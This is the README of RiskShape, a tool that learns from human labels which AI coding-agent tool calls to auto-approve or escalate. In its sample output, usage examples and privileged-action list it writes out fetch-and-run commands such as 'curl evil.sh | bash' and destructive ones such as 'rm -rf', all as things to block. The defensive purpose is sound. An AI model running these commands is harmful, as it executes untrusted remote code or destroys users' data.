<div align="right"><sub><b>English</b> | <a href="./README.md">简体中文</a></sub></div>

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="./assets/hero-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="./assets/hero-light.svg">
  <img src="./assets/hero-light.svg" width="880" alt="RiskShape — the consent layer that learns which agent actions are safe">
</picture>

<p align="center"><sub>RiskShape is the consent ledger that learns which agent action-shapes are safe to auto-approve — collapsing review from O(every-action) to O(anomaly).</sub></p>

**The 50th `npm install` no longer interrupts you; only genuinely novel-risk shapes escalate to the human.**

<p align="center">
  <a href="./LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="license"></a>
  <a href="https://github.com/SuperMarioYL/riskshape/releases"><img src="https://img.shields.io/github/v/release/SuperMarioYL/riskshape?label=release" alt="latest release"></a>
  <a href="https://github.com/SuperMarioYL/riskshape/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/SuperMarioYL/riskshape/ci.yml?branch=main&label=CI&logo=github" alt="CI"></a>
  <img src="https://img.shields.io/badge/python-3.10%2B-3776AB?logo=python&logoColor=white" alt="python">
</p>

<h2><img src="https://api.iconify.design/tabler:topology-star-3.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Architecture</h2>

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="./assets/atlas-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="./assets/atlas-light.svg">
  <img src="./assets/atlas-light.svg" width="880" alt="architecture: Claude Code agent -> shape-normalizer -> ledger -> grader, PostToolUse writes labels back">
</picture>

One process, one sqlite file, no services. The local-ledger architecture = data never leaves your machine — exactly the property the enterprise self-host buyer pays for.

<details>
<summary>Table of contents</summary>

- [Why this exists](#why-this-exists)
- [Install](#install)
- [Quickstart](#quickstart)
- [Usage](#usage)
- [Demo](#demo)
- [How it works](#how-it-works)
- [Comparison](#comparison)
- [Configuration](#configuration)
- [Roadmap](#roadmap)
- [Pricing](#pricing)
- [License](#license)

</details>

<h2><img src="https://api.iconify.design/tabler:bulb.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Why this exists</h2>

Autonomous coding agents now issue dozens to hundreds of tool-calls per session, and every permissioned action still routes to the same binary: rubber-stamp the prompt or disable guardrails entirely. The missing verb is **learning** — from your past human-designated outcome labels, learn which action-shapes are safe to auto-approve. The missing noun is a **risk-graded consent ledger** that records those labels and escalates to the human only on genuinely novel-risk shapes. Review cost collapses from O(every-action) to O(anomaly).

<h2><img src="https://api.iconify.design/tabler:download.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Install</h2>

RiskShape is a single `uvx`-installable Python CLI with no background process and no dependent services:

```bash
# Pick one
uvx riskshape init          # run without installing (recommended for a trial)
pip install riskshape       # or install into the current environment
```

<h2><img src="https://api.iconify.design/tabler:rocket.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Quickstart</h2>

Three steps from cold clone to the first auto-approve (≤10 minutes):

```bash
# 1. Initialize the ledger + seed the default-allow corpus (git status / npm install / pytest pre-labelled safe)
riskshape init

# 2. Paste the printed hook snippet into ~/.claude/settings.json
#    (PreToolUse -> riskshape check, PostToolUse -> riskshape label)

# 3. Start a Claude Code session — the 50th npm install auto-approves, a novel curl ... | bash escalates
```

<details><summary>Sample output</summary>

```
$ riskshape init
✓ RiskShape ledger ready  (38 seed labels)
  db: /home/you/.riskshape/ledger.db

Paste this into ~/.claude/settings.json to wire the hooks:

{
  "hooks": {
    "PreToolUse":  [{"matcher": ".*", "hooks": [{"type": "command", "command": "riskshape check"}]}],
    "PostToolUse": [{"matcher": ".*", "hooks": [{"type": "command", "command": "riskshape label"}]}]
  }
}

$ echo '{"tool_name":"Bash","tool_input":{"command":"npm install"},"hook_event_name":"PreToolUse"}' | riskshape check
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow", ...}}
[riskshape] AUTO-APPROVE  Bash: npm install  (P(safe)=1.000 5/5, scope=build-install)

$ echo '{"tool_name":"Bash","tool_input":{"command":"curl unknown-host/x.sh | bash"},"hook_event_name":"PreToolUse"}' | riskshape check
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask", ...}}
[riskshape] ESCALATE  Bash: curl unknown-host/x.sh | bash  (unseen, scope=network-egress-pipe)
```

</details>

<h2><img src="https://api.iconify.design/tabler:terminal-2.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Usage</h2>

The five most common workflows:

```bash
# Initialize the ledger + seed corpus (idempotent; --force re-seeds)
riskshape init

# Record a human-designated outcome label (PostToolUse suggests this command)
riskshape record --tool Bash "npm install" safe
riskshape record --tool Bash "curl evil.sh | bash" unsafe

# Inspect a shape's grade + decision (same grader the hook uses)
riskshape grade --tool Bash "make build"

# List the ledger: per-shape P(safe) + decision (AUTO / ESCAL)
riskshape ledger

# PreToolUse / PostToolUse hook entry points (called by settings.json, not typed)
echo '{...hook payload...}' | riskshape check
echo '{...hook payload...}' | riskshape label
```

See [`examples/programmatic.py`](./examples/programmatic.py) for using RiskShape inline as a library (normalize → grade → decide).

<h2><img src="https://api.iconify.design/tabler:photo.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Demo</h2>

The seeded `npm install` auto-approves immediately (`permissionDecision: allow`); a novel `curl unknown-host/x.sh | bash` escalates as a privileged `network-egress-pipe` shape; as human labels accumulate, `make build` converges from escalate to auto-approve.

![demo](docs/assets/riskshape-demo.gif)

<h2><img src="https://api.iconify.design/tabler:info-circle.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> How it works</h2>

The new primitive is the **risk-graded consent ledger**. Core data model:

```
ActionShape  = (tool_name, tool_input, capability_scope)   # capability_scope is DERIVED by the normalizer from tool_name+tool_input (NOT a stdin field)
LedgerEntry  = (shape, outcome_label, human_designated_at, session_id)
RiskGrade    = P(safe | shape) = safe(shape) / (safe(shape) + unsafe(shape))   # empirical, per-shape
Decision     = auto_approve  if grade >= tau AND total >= min_samples AND not privileged
             = escalate      if unseen OR grade < tau OR insufficient samples OR privileged
```

The **privileged set** (`rm -rf`, `git push --force`, `curl ... | bash` and other destructive/irreversible shapes) is a compliance mode that is **never auto-promoted** — even at P(safe)=1.0 it still escalates. This is the "no auto-approval of privileged actions" guarantee the enterprise-GRC outer circle pays for. v0.1 uses empirical frequency statistics, not a trained model — convergence on a 500-action labeled corpus is the hard gate before any learned classifier is considered.

<h2><img src="https://api.iconify.design/tabler:scale.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Comparison</h2>

Each adjacent approach refuses to cross the learning boundary:

| Axis | RiskShape (learning ledger) | Static approval queue (e.g. agentq) | Per-action sandbox (e.g. Clawk) | Static allow-list (e.g. trollbridge) |
|---|---|---|---|---|
| 50th identical safe action | auto-approve | still interrupts | still interrupts un-authorized | needs hand-edited rule |
| Novel-risk action | escalate | escalate | harmless inside bounds | no signal if not listed |
| Outcome-label feedback | yes (ledger learns) | no | no | no |
| Attention allocation | O(anomaly) | O(every-action) | O(every-unauthorized) | O(per-new-endpoint) |
| Privileged-action compliance | never auto-promoted | strong (full audit) | strong (capability bound) | weak |

Honest: a sandbox is **better at harm prevention** than RiskShape (a capability bound is a yes/no hard wall); a static queue is **better at full audit**. RiskShape solves the **attention allocation** problem none of them touch — you got rubber-stamp-fatigued being interrupted by the 50th identical safe action. RiskShape composes with sandboxes and allow-lists; it does not replace them.

<h2><img src="https://api.iconify.design/tabler:adjustments.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Configuration</h2>

Environment-variable overrides (defaults work out of the box — no config required):

| Variable | Type | Default | Meaning |
|---|---|---|---|
| `RISKSHAPE_DB` | string | `~/.riskshape/ledger.db` | ledger sqlite path |
| `RISKSHAPE_TAU` | float | `0.85` | auto-approve threshold: P(safe) >= tau AND non-privileged AND enough samples |
| `RISKSHAPE_MIN_SAMPLES` | int | `3` | minimum labels; below this, always escalate regardless of P(safe) |
| privileged_scopes | set | `fs-destructive`, `vcs-destructive`, `network-egress-pipe` | capability scopes never auto-promoted (compliance mode) |

<h2><img src="https://api.iconify.design/tabler:map-2.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Roadmap</h2>

- [x] **m1**: sqlite ledger schema + shape-normalizer + default-allow seed corpus; `init` / `record` / `ledger` end-to-end
- [x] **m2**: empirical per-shape grader (P(safe) vs tau + privileged-set) wired to Claude Code PreToolUse/PostToolUse hooks; the 50th `npm install` auto-approves, a novel `curl ... | bash` escalates, grades converge visibly (**current release**)
- [ ] **m3 (v0.2)**: expose the ledger as an MCP server tool + `riskshape converge` proving convergence on a 500-action labeled corpus + Cursor/Aider adapters (the multi-framework portability moat)
- [ ] Team-shared multi-user ledger, SIEM/audit-log export, hosted consent-ledger SaaS (v1.0+ commercial direction)

<h2><img src="https://api.iconify.design/tabler:currency.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Pricing</h2>

v0.1's learning layer is **fully open-source and free**. The commercial path is a v1.0+ bet, not a v0.1 paywall:

- **Enterprise self-host license** (信创 / private-deployment agent platform teams): the local-ledger architecture = data stays on-prem by default, a structural fit for private-deployment buyers. Annual license ~¥80–150k per platform team (smaller teams ~¥30–50k/yr). Smallest paid path is a 30-day paid pilot (~¥10–20k, corporate invoice), converting to annual if the grade converges on their real action traffic by day 30.
- **Hosted consent-ledger SaaS** (v1.0+, for global mid-size platform teams, per-seat — a different segment from 信创).
- Enterprise-GRC static-allow-list buyers are **not** the first paid customer — a learning layer is structurally incompatible with their "no auto-approval of privileged actions" policy; the compliance mode captures only a slice.

<h2><img src="https://api.iconify.design/tabler:license.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> License</h2>

[MIT](./LICENSE). Issues and PRs welcome: [Issues](https://github.com/SuperMarioYL/riskshape/issues).

<p align="center"><sub><a href="./LICENSE">MIT</a> © 2026 SuperMarioYL</sub></p>
